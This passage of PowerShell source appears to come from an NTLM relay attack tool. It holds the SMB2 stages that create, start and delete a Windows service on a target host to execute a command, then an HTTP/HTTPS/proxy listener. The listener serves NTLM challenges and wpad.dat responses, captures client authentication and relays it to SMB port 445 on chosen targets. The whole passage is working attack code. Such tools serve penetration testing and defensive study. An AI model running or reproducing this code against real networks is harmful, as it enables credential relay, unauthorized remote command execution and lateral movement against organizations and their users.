                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $SMB2_message_ID++
                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'StartServiceW'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '00-00-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service created on $Target") > $null
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Trying to execute command on $Target") > $null
                            $SMB_service_context_handle = $SMB_client_receive[112..131]
                            $SMB2_message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'     
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '31-04-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service creation failed on $Target") > $null
                            $SMB_relay_failed = $true
                        }
                        else
                        {
                            $SMB_relay_failed = $true
                        }

                    }
            
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] command executed on $Target") > $null
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service failed to start on $Target") > $null
                        }

                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] service $SMB_service deleted on $Target") > $null
                            $SMB2_message_ID++
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $SMB2_message_ID++ 
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($Attack -eq 'Session')
                        {
                            $inveigh.session_message_ID_table[$inveigh.session_count] = $SMB2_message_ID
                            $SMB_client_stage = 'Exit'
                        }
                        else
                        {
                            $SMB_client_stage = 'Logoff'
                        }
                        
                    }

                    'Logoff'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }

                if($SMB_relay_failed -and $Attack -ne 'Session')
                {
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay failed on $Target") > $null
                    $SMB_client_stage = 'Exit'
                }

            }
        
        }

        if(!$SMB_relay_failed -and $RelayAutoDisable -eq 'Y' -and $inveigh.target_list.Count -eq 1 -and $Attack -ne 'Session')
        {
            $inveigh.target_list.Remove($Target)
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay auto disabled due to success") > $null
            $inveigh.SMB_relay = $false
        }
        elseif(!$SMB_relay_failed -and $Attack -ne 'Session')
        {
            $inveigh.target_list.Remove($Target)
        }

        if($Attack -eq 'Session')
        {
            return $SMB_administrator
        }
        else
        {
            $SMB_relay_socket.Close()
        }
            
    }

}

# HTTP/HTTPS/Proxy Server ScriptBlock
$HTTP_scriptblock = 
{ 
    param ($Attack,$Challenge,$Command,$HTTPIP,$HTTPPort,$HTTPResetDelay,$HTTPResetDelayTimeout,$HTTPS_listener,
    $Proxy,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$Service,$SMB_version,$SessionLimit,$SessionPriority,
    $Target,$Username,$WPADAuth,$WPADAuthIgnore,$WPADResponse)

    function NTLMChallengeBase64
    {
        param ([String]$Challenge,[String]$ClientIPAddress,[Int]$ClientPort)

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object{"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ',''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($ClientIPAddress + $ClientPort + ',' + $HTTP_challenge)  > $null

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
                            $HTTP_challenge_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            $HTTP_timestamp +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge

        return $NTLM
    }

    if($HTTPS_listener)
    {
        $HTTP_type = "HTTPS"
    }
    elseif($proxy_listener)
    {
        $HTTP_type = "Proxy"
    }
    else
    {
        $HTTP_type = "HTTP"
    }

    if($HTTPIP -ne '0.0.0.0')
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }

    $HTTP_running = $true
    $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
    $HTTP_client_close = $true
    $process_ID_bytes = Get-ProcessIDArray
    $relay_step = 0

    if($proxy_listener)
    {
        $HTTP_linger = New-Object System.Net.Sockets.LingerOption($true,0)
        $HTTP_listener.Server.LingerState = $HTTP_linger
    }

    try
    {
        $HTTP_listener.Start()
    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        $HTTP_running = $false

        if($inveigh.file_output)
        {
            $inveigh.log_file_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        }

        if($inveigh.log_output)
        {
            $inveigh.log.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener")
        }

    }

    :HTTP_listener_loop while($inveigh.relay_running -and $HTTP_running)
    {
        $TCP_request = ""
        $TCP_request_bytes = New-Object System.Byte[] 4096
        $HTTP_send = $true
        $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("text/html")
        $HTTP_header_cache_control = ""
        $HTTP_header_authenticate = ""
        $HTTP_header_authenticate_data = ""
        $HTTP_message = ""
        $HTTP_header_authorization =  ""
        $HTTP_header_host = ""
        $HTTP_header_user_agent = ""
        $HTTP_request_raw_URL = ""
        $NTLM = "NTLM"
        
        while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
        {
            Start-Sleep -m 10

            if(!$inveigh.relay_running)
            {
                break HTTP_listener_loop
            }
        
        }
        
        if($relay_step -gt 0)
        {
            $relay_reset++

            if($relay_reset -gt 2)
            {
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay attack resetting") > $null
                $SMB_relay_socket.Close()
                $relay_step = 0
            }

        }
        else
        {
            $relay_reset = 0
        }

        if($HTTPS_listener)
        {
            
            if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.relay_running)
            {
                $HTTP_client = $HTTP_listener.AcceptTcpClient() 
	            $HTTP_clear_stream = $HTTP_client.GetStream()
                $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)
                $SSL_cert = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})
                $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }

            [byte[]]$SSL_request_bytes = $null

            do 
            {
                $HTTP_request_byte_count = $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
                $SSL_request_bytes += $TCP_request_bytes[0..($HTTP_request_byte_count - 1)]
            } while ($HTTP_clear_stream.DataAvailable)

            $TCP_request = [System.BitConverter]::ToString($SSL_request_bytes)
        }
        else
        {

            if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.relay_running)
            {
                $HTTP_client = $HTTP_listener.AcceptTcpClient() 
	            $HTTP_stream = $HTTP_client.GetStream()
            }

            if($HTTP_stream.DataAvailable)
            {
                $HTTP_data_available = $true
            }
            else
            {
                $HTTP_data_available = $false
            }

            while($HTTP_stream.DataAvailable)
            {
                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
            }

            $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
        }
        
        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*")
        {
            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString

            if($TCP_request -like "*-48-6F-73-74-3A-20-*")
            {
                $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 19)
                $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf("-0D-0A-"))
                $HTTP_header_host_extract = $HTTP_header_host_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)
            }

            if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
            {
                $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf("-0D-0A-"))
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)
            }

            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
            {
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP") > $null
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP") > $null
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent") > $null

                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                {
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP") > $null
                }

            }

            if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
            {
                $HTTP_header_authorization_extract = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Substring(0,$HTTP_header_authorization_extract.IndexOf("-0D-0A-"))
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_authorization = New-Object System.String ($HTTP_header_authorization_extract,0,$HTTP_header_authorization_extract.Length)
            }

            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
            $HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -like 'NTLM*' -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_client_close = $true
            }
            else
            {
                
                if($proxy_listener)
                {
                    $HTTP_response_status_code = 0x34,0x30,0x37
                    $HTTP_header_authenticate = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    $HTTP_response_status_code = 0x34,0x30,0x31
                    $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20

                    if($HTTP_request_raw_URL -match '/wpad.dat')
                    {
                        $HTTP_reset_delay = $true
                        $HTTP_reset_delay_timeout = New-TimeSpan -Seconds $HTTPResetDelayTimeout
                        $HTTP_reset_delay_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                    }

                }

                $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
                $HTTP_client_close = $false
            }
        
            if($HTTP_header_authorization.StartsWith('NTLM '))
            {
                $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''
                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)
            
                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                {
                    
                    if($inveigh.target_list -gt 1)
                    {

                        if($attack -eq 'Session')
                        {
                            $target = $null

                            ForEach($target_entry in $inveigh.target_list)
                            {

                                if(!$target)
                                {
                                    
                                    if($HTTP_source_IP -ne $target_entry -and ($inveigh.session_list | Where-Object {$_.Initiator -eq $HTTP_source_IP -and $_.Target -eq $target_entry -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
                                    {
                                        $target = $target_entry
                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target") > $null
                                    }

                                }

                            }

                            if(!$target -and $SessionPriority -eq 'Y')
                            {

                                ForEach($target_entry in $inveigh.target_list)
                                {

                                    if(!$target)
                                    {
                                        
                                        if($HTTP_source_IP -ne $target_entry -and ($inveigh.session_list | Where-Object {$_.Privileged -eq 'yes' -and $_.Target -eq $target_entry -and $_.Status -eq 'connected'} | Measure-Object).Count -lt $SessionLimit)
                                        {
                                            $target = $target_entry
                                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target") > $null
                                        }

                                    }

                                }

                            }

                        }
                        else
                        {
                            $target = $null

                            ForEach($target_entry in $inveigh.target_list)
                            {

                                if(!$target)
                                {

                                    if($HTTP_source_IP -ne $target_entry -and !$inveigh.relay_list.Contains("$HTTP_source_IP $target_entry"))
                                    {
                                        $target = $target_entry   
                                    }

                                }

                            }

                            if(!$target)
                            {
                                $target = $inveigh.target_list[(Get-Random -Maximum $inveigh.target_list.Count)]
                            }

                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selected $target as relay target") > $null
                        }

                    }
                    else
                    {
                      $target = $inveigh.target_list[0] 
                    }
                    
                    if($inveigh.SMB_relay -and $relay_step -eq 0 -and ($target -and $HTTP_source_IP -ne $target))
                    {
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay initiated by $HTTP_source_IP") > $null
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
                        $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                        $SMB_relay_socket.Client.ReceiveTimeout = 60000
                        $SMB_relay_socket.Connect($Target,"445")
                        $HTTP_client_close = $false
                        $relay_step = 1
                    
                        if(!$SMB_relay_socket.connected)
                        {
                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Relay target is not responding") > $null
                            $relay_step = 0
                        }

                        if($relay_step -eq 1)
                        {
                            $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes $SMB_version $process_ID_bytes

                            if($SMB_relay_bytes.Length -le 3)
                            {
                                $relay_step = 0
                                $NTLM = NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                            }

                        }

                        if($relay_step -eq 1)
                        {
                            $SMB_user_ID = $SMB_relay_bytes[34..33]
                            $SMB_relay_NTLMSSP = [System.BitConverter]::ToString($SMB_relay_bytes)
                            $SMB_relay_NTLMSSP = $SMB_relay_NTLMSSP -replace "-",""
                            $SMB_relay_NTLMSSP_index = $SMB_relay_NTLMSSP.IndexOf("4E544C4D53535000")
                            $SMB_relay_NTLMSSP_bytes_index = $SMB_relay_NTLMSSP_index / 2
                            $SMB_domain_length = DataLength2 ($SMB_relay_NTLMSSP_bytes_index + 12) $SMB_relay_bytes
                            $SMB_domain_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 12)..($SMB_relay_NTLMSSP_bytes_index + 19)]
                            $SMB_target_length = DataLength2 ($SMB_relay_NTLMSSP_bytes_index + 40) $SMB_relay_bytes
                            $SMB_target_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 40)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]
                            $SMB_relay_target_flag = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 22)]
                            $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
                            $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
                            $SMB_session_ID = $SMB_relay_bytes[44..51]
                            
                            if([System.BitConverter]::ToString($SMB_relay_bytes[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version -eq 'SMB1'
                            }
                    
                            $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                               $SMB_domain_length_offset_bytes +
                                               0x05,0x82 +
                                               $SMB_relay_target_flag +
                                               0xa2 +
                                               $SMB_relay_NTLM_challenge +
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
